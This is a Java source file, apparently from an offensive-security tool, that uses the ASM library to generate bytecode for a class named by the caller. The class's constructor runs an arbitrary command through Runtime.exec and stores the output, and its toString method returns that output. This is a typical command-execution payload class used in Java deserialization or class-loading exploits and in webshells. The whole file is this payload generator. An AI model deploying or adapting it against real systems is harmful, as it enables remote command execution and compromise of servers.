package org.sec.core;

import org.apache.log4j.Logger;
import org.objectweb.asm.ClassWriter;
import org.objectweb.asm.FieldVisitor;
import org.objectweb.asm.Label;
import org.objectweb.asm.MethodVisitor;
import org.objectweb.asm.Opcodes;

public class ByteCodeEvilDump implements Opcodes {
    private static final Logger logger = Logger.getLogger(ByteCodeEvilDump.class);


    public static byte[] dump (String name) {
        logger.info("generate new bytecode");
        ClassWriter classWriter = new ClassWriter(ClassWriter.COMPUTE_FRAMES);
        FieldVisitor fieldVisitor;
        MethodVisitor methodVisitor;

        classWriter.visit(V1_8, ACC_PUBLIC | ACC_SUPER, name, null,
                "java/lang/Object", null);

        {
            fieldVisitor = classWriter.visitField(0, "res",
                    "Ljava/lang/String;", null, null);
            fieldVisitor.visitEnd();
        }

        {
            methodVisitor = classWriter.visitMethod(ACC_PUBLIC, "<init>",
                    "(Ljava/lang/String;)V", null, new String[] { "java/io/IOException" });
            methodVisitor.visitCode();
            methodVisitor.visitVarInsn(ALOAD, 0);
            methodVisitor.visitMethodInsn(INVOKESPECIAL, "java/lang/Object",
                    "<init>", "()V", false);
            methodVisitor.visitTypeInsn(NEW, "java/lang/StringBuilder");
            methodVisitor.visitInsn(DUP);
            methodVisitor.visitMethodInsn(INVOKESPECIAL, "java/lang/StringBuilder",
                    "<init>", "()V", false);
            methodVisitor.visitVarInsn(ASTORE, 2);
            methodVisitor.visitTypeInsn(NEW, "java/io/BufferedReader");
            methodVisitor.visitInsn(DUP);
            methodVisitor.visitTypeInsn(NEW, "java/io/InputStreamReader");
            methodVisitor.visitInsn(DUP);
            methodVisitor.visitMethodInsn(INVOKESTATIC, "java/lang/Runtime", "getRuntime",
                    "()Ljava/lang/Runtime;", false);
            methodVisitor.visitVarInsn(ALOAD, 1);
            methodVisitor.visitMethodInsn(INVOKEVIRTUAL, "java/lang/Runtime", "exec",
                    "(Ljava/lang/String;)Ljava/lang/Process;", false);
            methodVisitor.visitMethodInsn(INVOKEVIRTUAL, "java/lang/Process", "getInputStream",
                    "()Ljava/io/InputStream;", false);
            methodVisitor.visitMethodInsn(INVOKESPECIAL, "java/io/InputStreamReader", "<init>",
                    "(Ljava/io/InputStream;)V", false);
            methodVisitor.visitMethodInsn(INVOKESPECIAL, "java/io/BufferedReader",
                    "<init>", "(Ljava/io/Reader;)V", false);
            methodVisitor.visitVarInsn(ASTORE, 3);
            Label label0 = new Label();
            methodVisitor.visitLabel(label0);
            methodVisitor.visitVarInsn(ALOAD, 3);
            methodVisitor.visitMethodInsn(INVOKEVIRTUAL, "java/io/BufferedReader",
                    "readLine", "()Ljava/lang/String;", false);
            methodVisitor.visitInsn(DUP);
            methodVisitor.visitVarInsn(ASTORE, 4);
            Label label1 = new Label();
            methodVisitor.visitJumpInsn(IFNULL, label1);
            methodVisitor.visitVarInsn(ALOAD, 2);
            methodVisitor.visitVarInsn(ALOAD, 4);
            methodVisitor.visitMethodInsn(INVOKEVIRTUAL, "java/lang/StringBuilder",
                    "append", "(Ljava/lang/String;)Ljava/lang/StringBuilder;", false);
            methodVisitor.visitLdcInsn("\n");
            methodVisitor.visitMethodInsn(INVOKEVIRTUAL, "java/lang/StringBuilder",
                    "append", "(Ljava/lang/String;)Ljava/lang/StringBuilder;", false);
            methodVisitor.visitInsn(POP);
            methodVisitor.visitJumpInsn(GOTO, label0);
            methodVisitor.visitLabel(label1);
            methodVisitor.visitVarInsn(ALOAD, 0);
            methodVisitor.visitVarInsn(ALOAD, 2);
            methodVisitor.visitMethodInsn(INVOKEVIRTUAL, "java/lang/StringBuilder",
                    "toString", "()Ljava/lang/String;", false);
            methodVisitor.visitFieldInsn(PUTFIELD, name, "res", "Ljava/lang/String;");
            methodVisitor.visitInsn(RETURN);
            methodVisitor.visitMaxs(6, 5);
            methodVisitor.visitEnd();
        }
        {
            methodVisitor = classWriter.visitMethod(ACC_PUBLIC, "toString",
                    "()Ljava/lang/String;", null, null);
            methodVisitor.visitCode();
            methodVisitor.visitVarInsn(ALOAD, 0);
            methodVisitor.visitFieldInsn(GETFIELD, name, "res", "Ljava/lang/String;");
            methodVisitor.visitInsn(ARETURN);
            methodVisitor.visitMaxs(1, 1);
            methodVisitor.visitEnd();
        }
        classWriter.visitEnd();

        return classWriter.toByteArray();
    }
}